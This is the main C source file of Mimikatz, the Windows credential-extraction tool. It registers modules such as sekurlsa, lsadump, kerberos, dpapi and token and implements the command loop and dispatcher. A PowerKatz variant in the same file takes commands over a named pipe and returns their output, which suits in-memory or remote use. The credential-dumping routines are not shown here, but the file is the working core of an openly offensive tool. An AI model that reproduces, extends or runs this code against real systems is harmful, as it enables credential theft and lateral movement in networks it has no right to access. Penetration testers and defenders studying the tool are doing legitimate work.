/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "mimikatz.h"

const KUHL_M * mimikatz_modules[] = {
	&kuhl_m_standard,
	&kuhl_m_crypto,
	&kuhl_m_sekurlsa,
	&kuhl_m_kerberos,
	&kuhl_m_privilege,
	&kuhl_m_process,
	&kuhl_m_service,
	&kuhl_m_lsadump,
	&kuhl_m_ts,
	&kuhl_m_event,
	&kuhl_m_misc,
	&kuhl_m_token,
	&kuhl_m_vault,
	&kuhl_m_minesweeper,
#if defined(NET_MODULE)
	&kuhl_m_net,
#endif
	&kuhl_m_dpapi,
	&kuhl_m_busylight,
	&kuhl_m_sysenv,
	&kuhl_m_sid,
	&kuhl_m_iis,
	&kuhl_m_rpc,
	&kuhl_m_sr98,
	&kuhl_m_rdm,
	&kuhl_m_acr,
};

int wmain(int argc, wchar_t * argv[])
{
	NTSTATUS status = STATUS_SUCCESS;
	int i;
#if !defined(_POWERKATZ)
	size_t len;
	wchar_t input[0xffff];
#endif
	mimikatz_begin();
	for(i = MIMIKATZ_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_FATAL_APP_EXIT) ; i++)
	{
		kprintf(L"\n(" MIMIKATZ_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
		status = mimikatz_dispatchCommand(argv[i]);
	}
#if !defined(_POWERKATZ)
	while (status != STATUS_FATAL_APP_EXIT)
	{
		kprintf(L"\n" MIMIKATZ L" # "); fflush(stdin);
		if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
		{
			if(input[len - 1] == L'\n')
				input[len - 1] = L'\0';
			kprintf_inputline(L"%s\n", input);
			status = mimikatz_dispatchCommand(input);
		}
	}
#endif
	mimikatz_end();
	return STATUS_SUCCESS;
}

void mimikatz_begin()
{
	kull_m_output_init();
#if !defined(_POWERKATZ)
	SetConsoleTitle(MIMIKATZ L" " MIMIKATZ_VERSION L" " MIMIKATZ_ARCH L" (oe.eo)");
	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
#endif
	mimikatz_initOrClean(TRUE);
}

void mimikatz_end()
{
	mimikatz_initOrClean(FALSE);
#if !defined(_POWERKATZ)
	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
#endif
	kull_m_output_clean();
#if !defined(_WINDLL)
	ExitProcess(STATUS_SUCCESS);
#endif
}

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	mimikatz_initOrClean(FALSE);
	return FALSE;
}

NTSTATUS mimikatz_initOrClean(BOOL Init)
{
	unsigned short indexModule;
	PKUHL_M_C_FUNC_INIT function;
	long offsetToFunc;
	NTSTATUS fStatus;
	HRESULT hr;

	if(Init)
	{
		RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
		MIMIKATZ_NT_BUILD_NUMBER &= 0x00007fff;
		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		if(FAILED(hr))
#if defined(_POWERKATZ)
			if(hr != RPC_E_CHANGED_MODE)
#endif
				PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
		kull_m_asn1_init();
	}
	else
		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);

	for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
	{
		if(function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (mimikatz_modules[indexModule]) + offsetToFunc))
		{
			fStatus = function();
			if(!NT_SUCCESS(fStatus))
				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), mimikatz_modules[indexModule]->shortName, fStatus);
		}
	}

	if(!Init)
	{
		kull_m_asn1_term();
		CoUninitialize();
		kull_m_output_file(NULL);
	}
	return STATUS_SUCCESS;
}

NTSTATUS mimikatz_dispatchCommand(wchar_t * input)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PWCHAR full;
	if(full = kull_m_file_fullPath(input))
	{
		switch(full[0])
		{
		case L'!':
			status = kuhl_m_kernel_do(full + 1);
			break;
		case L'*':
			status = kuhl_m_rpc_do(full + 1);
			break;
		default:
			status = mimikatz_doLocal(full);
		}
		LocalFree(full);
	}
	return status;
}

NTSTATUS mimikatz_doLocal(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
	unsigned short indexModule, indexCommand;
	BOOL moduleFound = FALSE, commandFound = FALSE;
	
	if(argv && (argc > 0))
	{
		if(match = wcsstr(argv[0], L"::"))
		{
			if(module = (wchar_t *) LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
			{
				if((unsigned int) (match + 2 - argv[0]) < wcslen(argv[0]))
					command = match + 2;
				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
			}
		}
		else command = argv[0];

		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(mimikatz_modules)); indexModule++)
			if(moduleFound = (!module || (_wcsicmp(module, mimikatz_modules[indexModule]->shortName) == 0)))
				if(command)
					for(indexCommand = 0; !commandFound && (indexCommand < mimikatz_modules[indexModule]->nbCommands); indexCommand++)
						if(commandFound = _wcsicmp(command, mimikatz_modules[indexModule]->commands[indexCommand].command) == 0)
							status = mimikatz_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);

		if(!moduleFound)
		{
			PRINT_ERROR(L"\"%s\" module not found !\n", module);
			for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
			{
				kprintf(L"\n%16s", mimikatz_modules[indexModule]->shortName);
				if(mimikatz_modules[indexModule]->fullName)
					kprintf(L"  -  %s", mimikatz_modules[indexModule]->fullName);
				if(mimikatz_modules[indexModule]->description)
					kprintf(L"  [%s]", mimikatz_modules[indexModule]->description);
			}
			kprintf(L"\n");
		}
		else if(!commandFound)
		{
			indexModule -= 1;
			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, mimikatz_modules[indexModule]->shortName);

			kprintf(L"\nModule :\t%s", mimikatz_modules[indexModule]->shortName);
			if(mimikatz_modules[indexModule]->fullName)
				kprintf(L"\nFull name :\t%s", mimikatz_modules[indexModule]->fullName);
			if(mimikatz_modules[indexModule]->description)
				kprintf(L"\nDescription :\t%s", mimikatz_modules[indexModule]->description);
			kprintf(L"\n");

			for(indexCommand = 0; indexCommand < mimikatz_modules[indexModule]->nbCommands; indexCommand++)
			{
				kprintf(L"\n%16s", mimikatz_modules[indexModule]->commands[indexCommand].command);
				if(mimikatz_modules[indexModule]->commands[indexCommand].description)
					kprintf(L"  -  %s", mimikatz_modules[indexModule]->commands[indexCommand].description);
			}
			kprintf(L"\n");
		}

		if(module)
			LocalFree(module);
		LocalFree(argv);
	}
	return status;
}

#if defined(_POWERKATZ)
HANDLE hPipe;
__declspec(dllexport) void main(void)
{
	int argc = 0;
	wchar_t ** argv;

	char buffer[256];
	DWORD dwRead;
	DWORD dwWritten;
	DWORD dwWrittenout;

	hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\LocalPipe"),
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,   // FILE_FLAG_FIRST_PIPE_INSTANCE is not needed but forces CreateNamedPipe(..) to fail if the pipe already exists...
		PIPE_UNLIMITED_INSTANCES,
		1024 * 16,
		1024 * 16,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);

	while (hPipe != INVALID_HANDLE_VALUE)
	{
		if (ConnectNamedPipe(hPipe, NULL) != FALSE)   // wait for someone to connect to the pipe
		{
			BOOL read = ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL);
			buffer[dwRead] = '\0';
			wchar_t str[256];
			mbstowcs(str, buffer, sizeof(char) * 256);
			if (read)
			{
				// run stuff
				if (wcscmp(str, L"exit") == NULL)
				{
					if (argv = CommandLineToArgvW(str, &argc))
					{
						outputBufferElements = 0xff;
						outputBufferElementsPosition = 0;
						if (outputBuffer = (wchar_t *)LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
							wmain(argc, argv);
						LocalFree(argv);
						char str[2048];
						wcstombs(str, outputBuffer, sizeof(char) * 2048);
						WriteFile(hPipe,
								str,
								sizeof(char) * 2048,   // = length of string + terminating '\0' !!!
								&dwWrittenout,
								NULL);
							Sleep(100);
							//CloseHandle(hPipe);
					}
					CloseHandle(hPipe);
					//break;
				}
				else
				{
					if (argv = CommandLineToArgvW(str, &argc))
					{
						outputBufferElements = 0xff;
						outputBufferElementsPosition = 0;
						if (outputBuffer = (wchar_t *)LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
							wmain(argc, argv);
						LocalFree(argv);
						char str[2048];
						wcstombs(str, outputBuffer, sizeof(char) * 2048);
						WriteFile(hPipe,
								str,
								sizeof(char) * 2048,   // = length of string + terminating '\0' !!!
								&dwWrittenout,
								NULL);
							Sleep(100);
							//CloseHandle(hPipe);
					}
				}
			}
		}

		DisconnectNamedPipe(hPipe);
		//break;
	}
}
#endif

#if defined(_WINDLL)
void CALLBACK mimikatz_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
{
	int argc = 0;
	wchar_t ** argv;
	if(AllocConsole())
	{
#pragma warning(push)
#pragma warning(disable:4996)
		freopen("CONOUT$", "w", stdout);
		freopen("CONOUT$", "w", stderr);
		freopen("CONIN$", "r", stdin);
#pragma warning(pop)
		if(lpszCmdLine && lstrlenW(lpszCmdLine))
		{
			if(argv = CommandLineToArgvW(lpszCmdLine, &argc))
			{
				wmain(argc, argv);
				LocalFree(argv);
			}
		}
		else wmain(0, NULL);
	}
}
#endif

FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli)
{
    if((dliNotify == dliFailLoadLib) && ((_stricmp(pdli->szDll, "ncrypt.dll") == 0) || (_stricmp(pdli->szDll, "bcrypt.dll") == 0)))
		RaiseException(ERROR_DLL_NOT_FOUND, 0, 0, NULL);
    return NULL;
}
#if !defined(_DELAY_IMP_VER)
const
#endif
PfnDliHook __pfnDliFailureHook2 = delayHookFailureFunc;